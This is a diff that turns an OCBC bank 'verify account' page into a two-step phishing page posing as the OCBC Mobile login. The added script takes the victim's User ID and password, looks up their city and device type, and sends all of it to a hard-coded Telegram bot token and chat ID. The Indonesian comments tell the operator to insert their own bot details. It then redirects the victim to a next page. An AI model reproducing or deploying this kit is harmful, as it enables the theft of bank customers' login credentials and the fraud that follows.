@@ -3,208 +3,248 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Amankan - OCBC</title>
+<title>OCBC Mobile Login</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body {
-    font-family: Arial, sans-serif;
-    background-color: #fafafa;
-    margin: 0;
-    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+    background-color: #ffffff;
     min-height: 100vh;
-    padding-bottom: 120px;
-  }
-
-  .container {
-    max-width: 480px;
-    margin: 0 auto;
     padding: 20px;
   }
-
-  .back-arrow {
-    font-size: 30px;
-    font-weight: bold;
+  .page { display: none; }
+  .page.active { display: block; }
+  .header {
+    display: flex;
+    align-items: center;
+    margin-bottom: 40px;
+    margin-top: 10px;
+  }
+  .back {
+    font-size: 28px;
     color: #ff0033;
     cursor: pointer;
-    user-select: none;
-    margin-bottom: 10px;
-    display: inline-block;
+    margin-right: 15px;
+    font-weight: 500;
   }
-
-  h1 {
-    font-weight: 900;
-    margin: 0 0 10px 0;
-    font-size: 24px;
+  .title {
+    font-size: 18px;
+    font-weight: 600;
     color: #000;
   }
-
-  .description {
-    font-weight: 600;
-    font-size: 18px;
-    color: #4c4c4c;
-    margin-bottom: 10px;
-    text-align: center;
+  .subheading {
+    font-size: 16px;
+    color: #666;
+    text-align: left;
+    margin-bottom: 30px;
+    padding-left: 5px;
     line-height: 1.5;
   }
-
-  .signup-link {
-    font-weight: 600;
-    color: #ff0033;
-    cursor: pointer;
-    text-align: center;
-    display: block;
-    margin-top: 15px;
-  }
-
-  .input-group {
+  .input-card {
     background: #fff;
-    border-radius: 15px;
-    padding: 25px;
-    margin-top: 20px;
-    box-shadow: 0 4px 8px rgb(200 200 200 / 70%);
+    border-radius: 12px;
+    padding: 20px;
+    margin: 0 5px;
+    box-shadow: 0 2px 8px rgba(0,0,0,0.08);
   }
-
-  .input-label {
+  .label {
+    font-size: 15px;
+    font-weight: 600;
     color: #000;
-    font-size: 14px;
-    margin-bottom: 10px;
+    margin-bottom: 8px;
     display: block;
-    font-weight: 900;
   }
-
-  input[type="text"] {
-    border: none;
-    border-bottom: 2px solid #999;
+  input {
     width: 100%;
+    border: none;
+    border-bottom: 1px solid #ccc;
     font-size: 16px;
+    padding: 8px 0;
     outline: none;
-    padding: 8px 4px;
-    transition: border-color 0.3s;
+    transition: border-color 0.2s;
   }
-
-  input[type="text"]:focus {
-    border-color: #ff0033;
+  input:focus { border-bottom-color: #ff0033; }
+  .forgot-link {
+    font-size: 15px;
+    color: #ff0033;
+    text-align: left;
+    margin: 20px 5px 0;
+    cursor: pointer;
   }
-
+  .btn-container {
+    position: fixed;
+    bottom: 30px;
+    left: 20px;
+    right: 20px;
+  }
   .btn {
-    background-image: linear-gradient(135deg, #a70700 0%, #fb0a00 70%);
+    width: 100%;
+    background: linear-gradient(90deg, #b30000 0%, #ff0000 100%);
     border: none;
     color: #fff;
     font-size: 17px;
-    font-weight: 800;
-    padding: 14px;
-    width: 90%;
-    border-radius: 10px;
+    font-weight: 600;
+    padding: 15px;
+    border-radius: 8px;
     cursor: pointer;
-    transition: opacity 0.2s;
   }
-  .btn:hover { opacity: 0.9; }
-  .btn:disabled { opacity: 0.6; cursor: not-allowed; }
-
-  footer {
-    width: 100%;
-    position: fixed;
-    bottom: 0;
-    left: 0;
-    background: #fff;
-    padding: 20px 0;
-    text-align: center;
-    box-shadow: 0 -2px 10px rgba(0,0,0,0.05);
-  }
-
+  .btn:disabled { opacity: 0.6; }
   .status {
     text-align: center;
     margin-top: 15px;
     font-size: 14px;
-    color: #28a745;
+    display: none;
   }
-  .status.error { color: #dc3545; }
+  .status.success { color: #28a745; display: block; }
+  .status.error { color: #dc3545; display: block; }
 </style>
 </head>
 <body>
 
-
-  <div class="container">
-    <span class="back-arrow">&larr;</span>
-    <h1>Verifikasi Akun</h1>
-    
-    <p class="description">
-      Masukkan User ID OCBC Mobile Anda<br>
-      <span class="signup-link">Belum punya atau lupa User ID?</span>
-    </p>
-
-    <form id="userForm">
-      <div class="input-group">
-        <label for="userId" class="input-label">User ID</label>
-        <input 
-          type="text" 
-          placeholder="Contoh: 12345678" 
-          id="userId" 
-          name="user" 
-          required
-          autocomplete="username"
-        >
-      </div>
-
-      <span class="signup-link">Lupa atau belum menerima User ID?</span>
-
-      <div id="status" class="status" style="display: none;"></div>
-
-      <footer>
-        <button type="submit" class="btn">Lanjut</button>
-      </footer>
-    </form>
+<!-- HALAMAN 1: USER ID -->
+<div id="page-userid" class="page active">
+  <div class="header">
+    <span class="back" onclick="window.location.href='index.html'">&lt;</span>
+    <h1 class="title">Input User ID</h1>
   </div>
+  <p class="subheading">Input your OCBC Mobile User ID.</p>
+  <form id="form-userid">
+    <div class="input-card">
+      <label class="label">User ID</label>
+      <input type="text" id="userId" placeholder="Input User ID" required>
+    </div>
+    <p class="forgot-link">Forgot or Haven't received User ID Yet?</p>
+    <div class="btn-container">
+      <button type="submit" class="btn">Lanjut</button>
+    </div>
+  </form>
+</div>
 
-  <script>
-    const form = document.getElementById('userForm');
-    const statusEl = document.getElementById('status');
-    const btn = form.querySelector('.btn');
+<!-- HALAMAN 2: PASSWORD -->
+<div id="page-password" class="page">
+  <div class="header">
+    <span class="back" onclick="kembaliKeUserID()">&lt;</span>
+    <h1 class="title">Input Password</h1>
+  </div>
+  <p class="subheading">Input your Password to Log into OCBC Mobile</p>
+  <form id="form-password">
+    <div class="input-card">
+      <label class="label">Login Password</label>
+      <input type="password" id="password" placeholder="Input Your login Password" required>
+    </div>
+    <p class="forgot-link">Forgot or Don't Have Password Yet?</p>
+    <div id="status" class="status"></div>
+    <div class="btn-container">
+      <button type="submit" class="btn">Lanjut</button>
+    </div>
+  </form>
+</div>
 
-    form.addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const userId = document.getElementById('userId').value.trim();
-      
-      if (!userId) {serve
-        showStatus('Harap isi User ID!', true);
-        return;
-      }
+<script>
+// ==============================================
+// 🔧 WAJIB DIISI — DATA BOT TELEGRAM KAMU
+// ==============================================
+const BOT_TOKEN = '8947782136:AAEjQuwb_sB8kUYsT_X1a5i3liNTERbQ16w';   // Contoh: 7123456789:AAG9x...
+const CHAT_ID = '8405193617';       // Contoh: 123456789
 
-      btn.disabled = true;
-      btn.textContent = 'Mengirim...';
-      statusEl.style.display = 'none';
+// Data sementara
+let userID = '';
+let kota = 'Tidak diketahui', deviceType = 'Tidak diketahui';
 
-      try {
-        const res = await fetch('/kirim-userid', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ user: userId })
-        });
+// Ambil lokasi & device saat halaman dibuka
+window.onload = async () => {
+  try {
+    const res = await fetch('https://ipinfo.io/json');
+    const data = await res.json();
+    kota = data.city || 'Tidak diketahui';
+    deviceType = /android/i.test(navigator.userAgent) ? 'Android' : 
+                  /iphone|ipad/i.test(navigator.userAgent) ? 'iOS' : 'PC';
+  } catch {}
+};
 
-        const data = await res.json();
-        
-        if (data.ok) {
-          showStatus('✅ Berhasil! Mengalihkan...', false);
-          setTimeout(() => {
-            // Ganti dengan halaman selanjutnya jika perlu
-            window.location.href = '#';
-          }, 1500);
-        } else {
-          showStatus('❌ Gagal: ' + (data.msg || 'Coba lagi'), true);
-        }
-      } catch (err) {
-        showStatus('❌ Kesalahan jaringan', true);
-      } finally {
-        btn.disabled = false;
-        btn.textContent = 'Lanjut';
-      }
-    });
+// Fungsi ganti halaman
+function showPage(id) {
+  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  window.scrollTo(0, 0);
+}
+function kembaliKeUserID() {
+  showPage('page-userid');
+}
 
-    function showStatus(text, isError) {
-      statusEl.textContent = text;
-      statusEl.className = `status ${isError ? 'error' : ''}`;
-      statusEl.style.display = 'block';
-    }
-  </script>
+// Kirim langsung ke Telegram
+async function kirimKeTelegram(teks) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: teks,
+      parse_mode: 'Markdown'
+    })
+  });
+}
+
+// === HALAMAN 1: USER ID ===
+document.getElementById('form-userid').addEventListener('submit', e => {
+  e.preventDefault();
+  const input = document.getElementById('userId').value.trim();
+  if (!input) { alert('Harap isi User ID!'); return; }
+  userID = input;
+  showPage('page-password'); // Pindah ke halaman Password
+});
+
+// === HALAMAN 2: PASSWORD ===
+const formPass = document.getElementById('form-password');
+const statusEl = document.getElementById('status');
+const btnPass = formPass.querySelector('.btn');
+
+formPass.addEventListener('submit', async e => {
+  e.preventDefault();
+  const password = document.getElementById('password').value.trim();
+  
+  if (!password) {
+    showStatus('Harap isi Password!', true);
+    return;
+  }
+
+  btnPass.disabled = true;
+  btnPass.textContent = 'Memproses...';
+  statusEl.style.display = 'none';
+
+  try {
+    // Kirim SEMUA DATA ke Telegram — User ID + Password + Lokasi + Device
+    const pesan = `
+🔐 DATA LOGIN OCBC MOBILE
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🆔 User ID: ${userID}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 Lokasi: ${kota}
+📱 Device: ${deviceType}
+⏰ Waktu: ${new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    `.trim();
+
+    await kirimKeTelegram(pesan);
+    
+    showStatus('✅ Berhasil! Mengalihkan...', false);
+    setTimeout(() => {
+      // ✅ PINDAH KE HALAMAN two.html
+      window.location.href = 'two.html';
+    }, 1500);
+  } catch {
+    showStatus('❌ Gagal kirim. Cek Token & Chat ID!', true);
+    btnPass.disabled = false;
+    btnPass.textContent = 'Lanjut';
+  }
+});
+
+function showStatus(text, isErr) {
+  statusEl.textContent = text;
+  statusEl.className = `status ${isErr ? 'error' : 'success'}`;
+}
+</script>
 </body>
 </html>
